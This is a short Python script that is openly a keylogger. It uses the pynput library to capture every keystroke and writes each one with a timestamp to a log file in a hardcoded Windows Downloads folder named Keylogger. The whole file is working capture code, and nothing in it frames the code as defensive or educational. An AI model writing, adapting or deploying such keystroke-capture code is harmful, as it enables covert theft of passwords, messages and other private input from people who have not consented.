from pynput.keyboard import Key, Listener
import logging

# Use raw string to handle backslashes in the file path
log_dir = r"C:\Users\Subhajit\Downloads\Keylogger\\"  # Ensure the path ends with a backslash
logging.basicConfig(filename=(log_dir + "keylog.txt"),
                    level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(str(key))  # Log the key as a string
    except Exception as e:
        logging.error(f"Error: {str(e)}")  # Log the error in case of failure

# Set up the listener for keystroke capture
with Listener(on_press=on_press) as listener:
    listener.join()
